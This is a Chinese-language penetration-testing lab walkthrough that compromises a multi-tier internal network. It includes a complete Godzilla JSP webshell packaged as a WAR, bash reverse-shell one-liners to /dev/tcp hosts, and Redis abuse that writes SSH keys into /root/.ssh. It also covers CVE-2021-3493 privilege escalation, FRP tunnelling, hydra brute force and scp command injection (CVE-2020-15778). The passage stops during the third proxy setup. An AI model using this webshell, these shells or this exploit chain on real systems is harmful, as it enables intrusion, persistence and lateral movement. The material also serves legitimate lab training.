<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="e5c93630d7f00a5b0d77e856dc23f112"><strong>一、实验环境</strong></h1>
<h1 data-content="1" id="fe56b498f96061d7c1bd8c52f68af45e"><strong>1.网络拓扑</strong></h1>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230619193652-95d401e2-0e95-1.png"/></p>
<h1 data-content="1" id="36e0703809a22d36f8cae38aadf53092"><strong>二、实验步骤</strong></h1>
<h2 data-content="1" id="0006e22f1dc9debddb32c03535418a5f">1 实验一：信息收集</h2>
<p>先使用常见的 ICMP 协议查看目标，目标网站的IP为192.168.1.129</p>
<pre><code>ping 192.168.1.129      # 探测目标主机</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143316-8173403c-0ffd-1.png"/><br/>
然后直接对目标IP进行端口扫描：</p>
<div class="highlight"><pre><span></span>nmap -T4 -sC -sV -p 1-10000 192.168.1.129
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143329-891e5790-0ffd-1.png"/></p>
<p>如上图，目标开启了22、80、81和6379端口。<br/>
对目标192.168.1.129进行目录爆破：</p>
<div class="highlight"><pre><span></span>python3 dirsearch.py -u "http://192.168.1.129" -e *
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143339-8f04e3c2-0ffd-1.png"/></p>
<p>拼接url：<a href="http://192.168.1.129/manager/html" target="_blank">http://192.168.1.129/manager/html</a> ，发现可访问打开tomcat管理页面。输入弱密码tomcat: tomcat，即可访问后台：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143531-d1ef4a38-0ffd-1.png"/></p>
<p>使用goby对目标192.168.1.129进行扫描，发现了redis未授权访问</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143538-d5cd3066-0ffd-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143545-da130128-0ffd-1.png"/></p>
<h2 data-content="1" id="1fbddcbd72a24b2f566ae768e7bd71af"><strong>2 实验二： tomcat后台getshell</strong></h2>
<p>弱口令爆破：<a href="http://192.168.1.129/manager/html" target="_blank">http://192.168.1.129/manager/html</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621143916-5821de9a-0ffe-1.png"/></p>
<p>提交用户名和密码后抓包，设置Authorization: Basic MTIzOjEyMw==这一部分为payload变量。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144007-76095b2c-0ffe-1.png"/></p>
<p>设置payload为Custom iterator，并按顺序设置以下3个payload。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144028-82acf640-0ffe-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144034-8699c562-0ffe-1.png"/><br/>
在此模块设置对payload的处理方式</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144053-91742018-0ffe-1.png"/></p>
<p>然后start attack，获得密码，即可登录。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144114-9e666f60-0ffe-1.png"/></p>
<p>base64解码：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144137-abbea1aa-0ffe-1.png"/></p>
<p>输入账号密码tomcat：tomcat后进入tomcat的后台管理页面，发现一处上传war包即可直接getshell。<br/>
使用哥斯拉生成一个 jsp马,将其单独放置于一个目录下,进入该目录，密码为pass</p>
<div class="highlight"><pre><span></span><span class="o">&lt;%!</span> <span class="nb">String</span> <span class="nx">xc</span><span class="o">=</span><span class="s2">"3c6e0b8a9c15224a"</span><span class="p">;</span> <span class="nb">String</span> <span class="nx">pass</span><span class="o">=</span><span class="s2">"pass"</span><span class="p">;</span> <span class="nb">String</span> <span class="nx">md5</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">pass</span><span class="o">+</span><span class="nx">xc</span><span class="p">);</span> <span class="kr">class</span> <span class="nx">X</span> <span class="kr">extends</span> <span class="nx">ClassLoader</span><span class="p">{</span><span class="kr">public</span> <span class="nx">X</span><span class="p">(</span><span class="nx">ClassLoader</span> <span class="nx">z</span><span class="p">){</span><span class="kr">super</span><span class="p">(</span><span class="nx">z</span><span class="p">);}</span><span class="kr">public</span> <span class="nx">Class</span> <span class="nx">Q</span><span class="p">(</span><span class="kr">byte</span><span class="p">[]</span> <span class="nx">cb</span><span class="p">){</span><span class="k">return</span> <span class="kr">super</span><span class="p">.</span><span class="nx">defineClass</span><span class="p">(</span><span class="nx">cb</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">cb</span><span class="p">.</span><span class="nx">length</span><span class="p">);}</span> <span class="p">}</span><span class="kr">public</span> <span class="kr">byte</span><span class="p">[]</span> <span class="nx">x</span><span class="p">(</span><span class="kr">byte</span><span class="p">[]</span> <span class="nx">s</span><span class="p">,</span><span class="kr">boolean</span> <span class="nx">m</span><span class="p">){</span> <span class="k">try</span><span class="p">{</span><span class="nx">javax</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">Cipher</span> <span class="nx">c</span><span class="o">=</span><span class="nx">javax</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">Cipher</span><span class="p">.</span><span class="nx">getInstance</span><span class="p">(</span><span class="s2">"AES"</span><span class="p">);</span><span class="nx">c</span><span class="p">.</span><span class="nx">init</span><span class="p">(</span><span class="nx">m</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">2</span><span class="p">,</span><span class="k">new</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">spec</span><span class="p">.</span><span class="nx">SecretKeySpec</span><span class="p">(</span><span class="nx">xc</span><span class="p">.</span><span class="nx">getBytes</span><span class="p">(),</span><span class="s2">"AES"</span><span class="p">));</span><span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">doFinal</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span> <span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="kc">null</span><span class="p">;</span> <span class="p">}}</span> <span class="kr">public</span> <span class="kr">static</span> <span class="nb">String</span> <span class="nx">md5</span><span class="p">(</span><span class="nb">String</span> <span class="nx">s</span><span class="p">)</span> <span class="p">{</span><span class="nb">String</span> <span class="nx">ret</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span><span class="k">try</span> <span class="p">{</span><span class="nx">java</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">MessageDigest</span> <span class="nx">m</span><span class="p">;</span><span class="nx">m</span> <span class="o">=</span> <span class="nx">java</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">MessageDigest</span><span class="p">.</span><span class="nx">getInstance</span><span class="p">(</span><span class="s2">"MD5"</span><span class="p">);</span><span class="nx">m</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">getBytes</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">());</span><span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">java</span><span class="p">.</span><span class="nx">math</span><span class="p">.</span><span class="nx">BigInteger</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">m</span><span class="p">.</span><span class="nx">digest</span><span class="p">()).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toUpperCase</span><span class="p">();}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{}</span><span class="k">return</span> <span class="nx">ret</span><span class="p">;</span> <span class="p">}</span> <span class="kr">public</span> <span class="kr">static</span> <span class="nb">String</span> <span class="nx">base64Encode</span><span class="p">(</span><span class="kr">byte</span><span class="p">[]</span> <span class="nx">bs</span><span class="p">)</span> <span class="kr">throws</span> <span class="nx">Exception</span> <span class="p">{</span><span class="nx">Class</span> <span class="nx">base64</span><span class="p">;</span><span class="nb">String</span> <span class="nx">value</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span><span class="k">try</span> <span class="p">{</span><span class="nx">base64</span><span class="o">=</span><span class="nx">Class</span><span class="p">.</span><span class="nx">forName</span><span class="p">(</span><span class="s2">"java.util.Base64"</span><span class="p">);</span><span class="nb">Object</span> <span class="nx">Encoder</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">getMethod</span><span class="p">(</span><span class="s2">"getEncoder"</span><span class="p">,</span> <span class="kc">null</span><span class="p">).</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">base64</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span><span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="nb">String</span><span class="p">)</span><span class="nx">Encoder</span><span class="p">.</span><span class="nx">getClass</span><span class="p">().</span><span class="nx">getMethod</span><span class="p">(</span><span class="s2">"encodeToString"</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="kr">byte</span><span class="p">[].</span><span class="kr">class</span> <span class="p">}).</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">Encoder</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="nx">bs</span> <span class="p">});}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span><span class="k">try</span> <span class="p">{</span> <span class="nx">base64</span><span class="o">=</span><span class="nx">Class</span><span class="p">.</span><span class="nx">forName</span><span class="p">(</span><span class="s2">"sun.misc.BASE64Encoder"</span><span class="p">);</span> <span class="nb">Object</span> <span class="nx">Encoder</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">newInstance</span><span class="p">();</span> <span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="nb">String</span><span class="p">)</span><span class="nx">Encoder</span><span class="p">.</span><span class="nx">getClass</span><span class="p">().</span><span class="nx">getMethod</span><span class="p">(</span><span class="s2">"encode"</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="kr">byte</span><span class="p">[].</span><span class="kr">class</span> <span class="p">}).</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">Encoder</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="nx">bs</span> <span class="p">});}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e2</span><span class="p">)</span> <span class="p">{}}</span><span class="k">return</span> <span class="nx">value</span><span class="p">;</span> <span class="p">}</span> <span class="kr">public</span> <span class="kr">static</span> <span class="kr">byte</span><span class="p">[]</span> <span class="nx">base64Decode</span><span class="p">(</span><span class="nb">String</span> <span class="nx">bs</span><span class="p">)</span> <span class="kr">throws</span> <span class="nx">Exception</span> <span class="p">{</span><span class="nx">Class</span> <span class="nx">base64</span><span class="p">;</span><span class="kr">byte</span><span class="p">[]</span> <span class="nx">value</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span><span class="k">try</span> <span class="p">{</span><span class="nx">base64</span><span class="o">=</span><span class="nx">Class</span><span class="p">.</span><span class="nx">forName</span><span class="p">(</span><span class="s2">"java.util.Base64"</span><span class="p">);</span><span class="nb">Object</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">getMethod</span><span class="p">(</span><span class="s2">"getDecoder"</span><span class="p">,</span> <span class="kc">null</span><span class="p">).</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">base64</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span><span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="kr">byte</span><span class="p">[])</span><span class="nx">decoder</span><span class="p">.</span><span class="nx">getClass</span><span class="p">().</span><span class="nx">getMethod</span><span class="p">(</span><span class="s2">"decode"</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="nb">String</span><span class="p">.</span><span class="kr">class</span> <span class="p">}).</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">decoder</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="nx">bs</span> <span class="p">});}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span><span class="k">try</span> <span class="p">{</span> <span class="nx">base64</span><span class="o">=</span><span class="nx">Class</span><span class="p">.</span><span class="nx">forName</span><span class="p">(</span><span class="s2">"sun.misc.BASE64Decoder"</span><span class="p">);</span> <span class="nb">Object</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">newInstance</span><span class="p">();</span> <span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="kr">byte</span><span class="p">[])</span><span class="nx">decoder</span><span class="p">.</span><span class="nx">getClass</span><span class="p">().</span><span class="nx">getMethod</span><span class="p">(</span><span class="s2">"decodeBuffer"</span><span class="p">,</span> <span class="k">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="nb">String</span><span class="p">.</span><span class="kr">class</span> <span class="p">}).</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">decoder</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="nx">bs</span> <span class="p">});}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e2</span><span class="p">)</span> <span class="p">{}}</span><span class="k">return</span> <span class="nx">value</span><span class="p">;</span> <span class="p">}</span><span class="o">%&gt;&lt;%</span><span class="k">try</span><span class="p">{</span><span class="kr">byte</span><span class="p">[]</span> <span class="nx">data</span><span class="o">=</span><span class="nx">base64Decode</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="nx">pass</span><span class="p">));</span><span class="nx">data</span><span class="o">=</span><span class="nx">x</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span><span class="k">if</span> <span class="p">(</span><span class="nx">session</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">"payload"</span><span class="p">)</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span><span class="nx">session</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">"payload"</span><span class="p">,</span><span class="k">new</span> <span class="nx">X</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">getClass</span><span class="p">().</span><span class="nx">getClassLoader</span><span class="p">()).</span><span class="nx">Q</span><span class="p">(</span><span class="nx">data</span><span class="p">));}</span><span class="k">else</span><span class="p">{</span><span class="nx">request</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">"parameters"</span><span class="p">,</span><span class="nx">data</span><span class="p">);</span><span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ByteArrayOutputStream</span> <span class="nx">arrOut</span><span class="o">=</span><span class="k">new</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ByteArrayOutputStream</span><span class="p">();</span><span class="nb">Object</span> <span class="nx">f</span><span class="o">=</span><span class="p">((</span><span class="nx">Class</span><span class="p">)</span><span class="nx">session</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">"payload"</span><span class="p">)).</span><span class="nx">newInstance</span><span class="p">();</span><span class="nx">f</span><span class="p">.</span><span class="nx">equals</span><span class="p">(</span><span class="nx">arrOut</span><span class="p">);</span><span class="nx">f</span><span class="p">.</span><span class="nx">equals</span><span class="p">(</span><span class="nx">pageContext</span><span class="p">);</span><span class="nx">response</span><span class="p">.</span><span class="nx">getWriter</span><span class="p">().</span><span class="nx">write</span><span class="p">(</span><span class="nx">md5</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">));</span><span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span><span class="nx">response</span><span class="p">.</span><span class="nx">getWriter</span><span class="p">().</span><span class="nx">write</span><span class="p">(</span><span class="nx">base64Encode</span><span class="p">(</span><span class="nx">x</span><span class="p">(</span><span class="nx">arrOut</span><span class="p">.</span><span class="nx">toByteArray</span><span class="p">(),</span> <span class="kc">true</span><span class="p">)));</span><span class="nx">response</span><span class="p">.</span><span class="nx">getWriter</span><span class="p">().</span><span class="nx">write</span><span class="p">(</span><span class="nx">md5</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">16</span><span class="p">));}</span> <span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">){}</span><span class="o">%&gt;</span>
</pre></div>
<p>将 shell.jsp 马打包成 war 包</p>
<div class="highlight"><pre><span></span>./jar.exe cvf shell.war shell.jsp
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144213-c11f24a2-0ffe-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144219-c4b4e7f0-0ffe-1.png"/><br/>
进入登录界面,部署上传</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144240-d160e422-0ffe-1.png"/><br/>
链接的地址是 /zip文件的前缀/文件名，比如我这里就是<a href="http://192.168.1.129/shell/shell.jsp" target="_blank">http://192.168.1.129/shell/shell.jsp</a><br/>
使用哥斯拉进行连接：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144256-dabb5886-0ffe-1.png"/></p>
<p>哥斯拉 v4.1 成功连接。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144309-e27903e8-0ffe-1.png"/></p>
<p>尝试反弹shell到Kali上再进行提权：</p>
<div class="highlight"><pre><span></span>bash -c 'exec bash -i &gt;<span class="err">&amp;</span> /dev/tcp/192.168.1.128/8888 0&gt;<span class="err">&amp;</span>1'
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144329-ee8b727e-0ffe-1.png"/></p>
<p>Kali进行监听，但是最后没有反应</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144352-fc38f7c0-0ffe-1.png"/><br/>
尝试MSF的tcp、http均不行，故判断为不出网。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144409-06499328-0fff-1.png"/></p>
<h2 data-content="1" id="f83072aa790502a2ee05354951b88d78"><strong>3 实验三：从redis未授权到getshell</strong></h2>
<p>既然反弹不了shell，只能从其他地方进行入手了。<br/>
端口扫描时发现该机器开着 6379 端口，尝试 redis 未授权访问漏洞。<br/>
  尝试连接：</p>
<div class="highlight"><pre><span></span>redis-cli -h 192.168.1.129
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144534-38dc9b46-0fff-1.png"/></p>
<p>存在redis未授权，那么利用就简单了，我们直接往目标主机上写入SSH公钥。<br/>
  在攻击机上生成ssh公钥：</p>
<div class="highlight"><pre><span></span>ssh-keygen -t rsa
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144554-44e511c0-0fff-1.png"/></p>
<p>然后将公钥导入1.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把1.txt文件内容写入目标主机的redis缓冲里：</p>
<pre><code>将公钥导入1.txt文件：
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") &gt; 1.txt 
  把1.txt文件内容写入目标主机的redis缓冲中：
cat 1.txt | redis-cli -h 192.168.1.129 -p 6379 -x set hello</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144619-53daafc8-0fff-1.png"/></p>
<p>然后使用攻击机连接目标机器Redis，分别执行如下命令将ssh公钥写入目标主机。</p>
<pre><code>设置redis的备份路径为/root/.ssh/： config set dir /root/.ssh
设置保存文件名为authorized_keys ： config set dbfilename authorized_keys
将数据保存在目标服务器硬盘上： save</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144632-5b8a20e6-0fff-1.png"/><br/>
写入成功后直接尝试连接：</p>
<div class="highlight"><pre><span></span>ssh 192.128.1.129
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144646-64230df8-0fff-1.png"/><br/>
成功连接 192.1681.129 后，进行信息搜集发现了这台主机的内网 ip 地址 192.168.52.10</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144701-6cf5cf74-0fff-1.png"/><br/>
因为之前的shell反弹不了，所以看一下nginx的配置文件是不是做了反向代理</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144716-75ce6cfa-0fff-1.png"/><br/>
发现了 nginx 反向代理的标志 proxy_pass。ubuntu 18（192.168.52.10）服务器上的 nginx 将 80 端口收到的请求转发给了 <a href="http://192.168.52.20:8080，将" target="_blank">http://192.168.52.20:8080，将</a> 81端口收到的请求转发给了 <a href="http://192.168.52.20:8000。" target="_blank">http://192.168.52.20:8000。</a><br/>
所以 80端口的 shell 反弹不到攻击机，只能使用 ubuntu18 (web1)（192.168.52.10）做为跳板机，先将 tomcat的 shell（192.168.52.20）反弹到 ubuntu (web1)</p>
<div class="highlight"><pre><span></span>nc -lvp 1234
bash -c "bash -i &gt;<span class="err">&amp;</span> /dev/tcp/192.168.52.10/1234 0&gt;<span class="err">&amp;</span>1"   # 反弹shell
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144728-7d2dfaba-0fff-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621144734-806bfede-0fff-1.png"/></p>
<h2 data-content="1" id="66c20ea938ea0aec20bc0331919210ef">4 实验四：cve-2021-3493提权</h2>
<p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br/>
   linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。<br/>
CVE-2021-3493漏洞影响版本：</p>
<ul>
<li>Ubuntu 20.10</li>
<li>Ubuntu 20.04 LTS</li>
<li>Ubuntu 18.04 LTS</li>
<li>Ubuntu 16.04 LTS</li>
<li>Ubuntu 14.04 ESM
<pre><code>uname -a            # 查看系统详细信息
hostname            # 当前主机的主机名</code></pre>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145027-e7fea1f0-0fff-1.png"/><br/>
漏洞利用 exp 下载地址：<a href="https://github.com/briskets/CVE-2021-3493" target="_blank">https://github.com/briskets/CVE-2021-3493</a><br/>
进入到tmp目录
<pre><code>vim exploit.c           #将下载的exploit.c的内容粘贴到该文件中
gcc exploit.c -o exploit    #编译
chmod +x exploit
./exploit</code></pre>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145041-efffe9ea-0fff-1.png"/>
</li>
</ul>
<p>成功提权。</p>
<p>注意事项：vim exploit.c后需要输入i后复制<a href="https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c中的内容；若不输入i，编译时会报错。" target="_blank">https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c中的内容；若不输入i，编译时会报错。</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145108-0037fa28-1000-1.png"/></p>
<p>发现第三个网段：<br/>
fconfig</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145129-0cdf5dca-1000-1.png"/></p>
<h2 data-content="1" id="13886a7049fe5a9b28a32739a330fdcd"><strong>5 实验五：两层隧道搭建</strong></h2>
<p>Socks 隧道搭建使用 FRP + proxychains实现，frp项目地址：<a href="https://github.com/fatedier/frp" target="_blank">https://github.com/fatedier/frp</a> ,搭建过程中使用到的端口需要在防火墙开放，需要注意不同系统需下载不同版本，如攻击机（服务端）为linux 则需要下载 linux 版本，受害者（客户端）为 windwos 则需要下载 windwos 版本，以下配置直接复制到frps.ini、frpc.ini文件运行即可，运行后使用 socks5 代理工具proxychains即可进行流量代理。</p>
<ul>
<li>第一层代理（反向）：<br/>
服务端（server）：kali(192.168.1.128)</li>
</ul>
<div class="highlight"><pre><span></span>frps.ini

[common]
Bind_addr = 0.0.0.0
bind_port = 7000

启动
chmod +777 frps
./frps -c ./frps.ini
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145229-30cd8ff4-1000-1.png"/><br/>
客户端（client）：ubuntu-web1(192.168.1.129)<br/>
会将客户端中所有的流量通过本地的一个随机端口转发给vps的7000端口，我们访问vps的7777端口就相当于访问客户端的7000端口</p>
<div class="highlight"><pre><span></span>frpc.ini

[common]
server_addr = 192.168.1.128
server_port = 7000

[plugin_socks]
type = tcp
remote_port = 7777
plugin = socks5

上传frp

tar czvf 1.tgz frp_0.49.0_linux_amd64       # 压缩frp(192.168.1.128终端)
python3 -m http.server  (192.168.1.128终端)
wget http://192.168.1.128:8000/1.tgz;tar -zxvf 1.tgz    (192.168.1.129终端)
启动
chmod +777 frpc
nohup ./frpc -c ./frpc.ini &gt;/dev/null 2&gt;<span class="err">&amp;</span>1 <span class="err">&amp;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145249-3c3ecbe6-1000-1.png"/></p>
<ul>
<li>第二层代理（反向）：<br/>
服务端（server）：ubuntu-web1(192.168.52.10)</li>
</ul>
<div class="highlight"><pre><span></span>frps.ini

[common]
bind_addr = 192.168.52.10
bind_port = 7000

启动
chmod +777 frps
./frps -c ./frps.ini
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145333-569d80d6-1000-1.png"/><br/>
客户端 （client）ubuntu-web2(192.168.52.20)<br/>
会将客户端中所有的流量通过本地的一个随机端口转发给vps的7000端口，我们访问vps的7777端口就相当于访问客户端的7000端口</p>
<div class="highlight"><pre><span></span>frpc.ini

[common]
server_addr = 192.168.52.10
server_port = 7000

[plugin_socks]
type = tcp
remote_port = 7777
plugin = socks5

上传frp
tar czvf 1.tgz frp_0.49.0_linux_amd64       # 压缩frp(192.168.52.10终端)
python3 -m http.server  (192.168.52.10终端)
wget http://192.168.52.10:8000/1.tgz;tar -zxvf 1.tgz    (192.168.52.20终端)
启动
chmod +777 frpc
nohup ./frpc -c ./frpc.ini &gt;/dev/null 2&gt;<span class="err">&amp;</span>1 <span class="err">&amp;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145356-6452551c-1000-1.png"/></p>
<p>kali本地添加proxy配置</p>
<div class="highlight"><pre><span></span>vim /etc/proxychains4.conf 
socks5 192.168.1.128 7777
socks5 192.168.52.10 7777
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145409-6c274680-1000-1.png"/></p>
<p>通过代理，测试一下</p>
<div class="highlight"><pre><span></span>proxychains nmap -Pn -sT -sV -F -O 192.168.52.20
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145425-75e8126c-1000-1.png"/></p>
<h2 data-content="1" id="1321c81955e0289a8ffa6a8b46672972"><strong>6 实验六: OpenSSH命令注入漏洞(CVE-2020-15778)</strong></h2>
<p>OpenSSH是SSH（Secure SHell）协议的免费开源实现。OpenSSH是个SSH的软件，linux/unix都用openssh软件提供SSH服务。scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。<br/>
该漏洞编号CVE-2020-15778。OpenSSH的8.3p1及之前版本中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。</p>
<div class="highlight"><pre><span></span>通过proxychains扫描第三层网络：
探测92.168.71.1/24网段存活主机
proxychains nmap -Pn -sT -sV -F -O 192.168.71.1/24
扫描192.168.71.20
proxychains nmap -Pn -sT -sV -F -O 192.168.71.20
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145725-e100780a-1000-1.png"/><br/>
发现192.168.71.20的OpenSSH版本低于8.3p1<br/>
使用hydra对192.168.71.20进行爆破</p>
<div class="highlight"><pre><span></span>proxychains hydra -L /usertest.txt -P /passtest.txt ssh://192.168.71.20
</pre></div>
<p>-L /usertest.txt    #用户<br/>
-P /passtest.txt    #密码<br/>
ssh://192.168.71.20 #协议</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145752-f0fe60b4-1000-1.png"/><br/>
此处存在弱口令cs/123<br/>
利用scp命令，对centos进行写文件，复制文件。</p>
<div class="highlight"><pre><span></span>scp / test.txt cs@192.168.71.20:'`touch /tmp/test.sh`/tmp'
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145807-fa458ea4-1000-1.png"/><br/>
ssh连接192.168.71.20</p>
<div class="highlight"><pre><span></span>proxychains ssh cs@192.168.71.20
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145820-017d4144-1001-1.png"/><br/>
连接成功，发现192.168.93.10网段。</p>
<ul>
<li>第三层代理<br/>
服务端（server）：web2(192.168.71.10)</li>
</ul>
<div class="highlight"><pre><span></span>frps.ini

[common]
Bind_addr = 192.168.71.10
bind_port = 7000 #服务端监听端口，默认7000。监听来自客户端的流量

启动
chmod +777 frps
